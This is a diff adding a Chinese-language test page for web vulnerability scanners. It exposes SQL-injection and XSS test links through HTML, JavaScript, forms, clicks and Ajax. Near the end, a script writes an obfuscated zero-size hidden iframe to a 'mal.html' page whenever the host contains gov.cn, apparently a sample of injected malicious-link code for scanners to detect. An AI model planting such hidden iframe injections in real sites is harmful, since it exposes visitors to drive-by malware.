@@ -1,0 +1,140 @@
+<html><head><meta http-equiv="content-type" content="text/html; charset=utf-8">
+<title>AISec漏洞扫描器测试平台</title>
+
+</head><body bgcolor="#fffff"><br><center>AISec漏洞扫描器测试平台</center>
+
+<style>
+.demo{background-color:#eeeeee;margin:30px;padding:20px;}
+</style>
+
+
+
+
+
+<div class="demo">
+以下是普通的HTML链接"html_link.php?id=1"。如果扫描器使用了HTMLParser，就可以获得该链接，并能检测出该链接存在SQL注入:<br>
+<a href="html_link.php?id=2">html_link.php?id=1</a>
+</div>
+
+
+
+
+
+
+<!-- use Javascript to create links -->
+<div class="demo" id="jsCode">
+以下是Javascript生成的链接"js_link.php?id=1&amp;msg=abc"。如果扫描器支持Javascript，就可以获得该链接，并能检测出该链接存在SQL注入、XSS漏洞:(<a href="#" onclick="alert(document.getElementById('jsCode').innerHTML);return false;">查看代码</a>)<br>
+
+<a id="hi" href="js_link.php?id=2&amp;msg=abc">js_link.php?id=1&amp;msg=abc</a>
+<script>
+url="js_link.php"+"?id=2&msg=abc";
+hi.href=url;
+</script>
+</div>
+
+
+
+
+
+
+
+
+
+<!-- send form -->
+<div class="demo" id="formCode">
+以下是一个Post类型的表单，提交后生成"post_link.php?id=1&amp;msg=1"。如果扫描器能够"自动分析表单"，就可以获得该链接，并能检测出该链接存在SQL注入、XSS漏洞：(<a href="#" onclick="alert(document.getElementById('formCode').innerHTML);return false;">查看代码</a>)<br>
+
+<form method="post" name="form1" enctype="multipart/form-data" action="post_link.php">
+<script>
+document.write('<input type="text" name="i'+'d" size="30" value=1><br>');
+document.write('<input type="text" name="m'+'sg" size="30" value="abc">');
+</script><input type="text" name="id" size="30" value="1"><br><input type="text" name="msg" size="30" value="abc">
+<input type="submit" value="提交" name="B1">
+</form>
+</div>
+
+
+
+
+
+
+
+
+<div class="demo" id="clickCode">
+用户点击以下按钮后，会生成链接"click_link.php?id=1"。如果扫描器支持"自动交互"，就可以获得该链接，并能检测出该链接存在SQL注入：(<a href="#" onclick="alert(document.getElementById('clickCode').innerHTML);return false;">查看代码</a>)
+<br>
+
+<div id="abc">-</div>
+<input type="button" id="1" onclick="abc.innerHTML ='&lt;a href=click_link.php'+'?id=2&gt;click_link.php?id=2&lt;/a&gt;'" value="点击后生成链接(click_link.php?id=1)">
+</div>
+
+
+
+
+
+
+
+
+
+<!-- send ajax -->
+<div class="demo" id="ajaxCode">
+以下代码会发送一个Ajax请求，链接为“ajax_link.php?id=1&amp;t=”。如果扫描器支持Ajax，就可以获得该链接，并能检测出该链接存在SQL注入：(<a href="#" onclick="alert(document.getElementById('ajaxCode').innerHTML);return false;">查看代码</a>)
+<br>
+
+<script>
+if(window.ActiveXObject) ajax=new ActiveXObject("Microsoft.XMLHTTP");
+else ajax=new XMLHttpRequest();
+ajax.open('post',"ajax_link.php?id=1&t="+Math.random(),false);
+ajax.send();
+document.write("ajax.ResponseText length:"+ajax.responseText.length);
+</script>ajax.ResponseText length:265
+</div>
+
+
+
+
+
+
+<!-- execute ajax -->
+<div class="demo" id="ifCode">
+当本站的域名是gov.cn时，以下代码生成链接为“if_link.php?id=2”。如果扫描器支持（高启发）路径执行，就可以获得该链接，并能检测出该链接存在SQL注入：(<a href="#" onclick="alert(document.getElementById('ifCode').innerHTML);return false;">查看代码</a>)
+<br>
+
+<script>
+document.cookie="u=guest";
+if(document.location.host=="gov.cn"){
+	document.write("<a href"+"='if_link.php?id=2'>if_link.php?id=2</a>");
+	document.location="/notExitst/";
+}
+</script>
+</div>
+
+
+
+<!--加载来自第三方的挂马网页-->
+<script>
+if(document.location.href.indexOf("gov.cn")>0){
+	document.write("<ifr");
+	document.write("ame src='http://info.aisec.cn/");
+	document.write("demo/aisec/mal.html?id=1&from=html' width=0 height=0></iframe>");
+}
+</script>
+<!--和谐挂链,各挂各链-->
+
+
+
+
+<div class="demo" style="background-color:#e3e3e3">
+<a href="login.php">Web登录页面口令破解</a>
+<a href="other/"></a>
+<a href="cookie_link.php?id=1"></a>
+
+&nbsp;&nbsp;&nbsp;&nbsp;
+
+<a href="http://demo.aisec.cn">查看更多测试平台</a>
+</div>
+
+
+<br><br><br>
+
+</body></html>
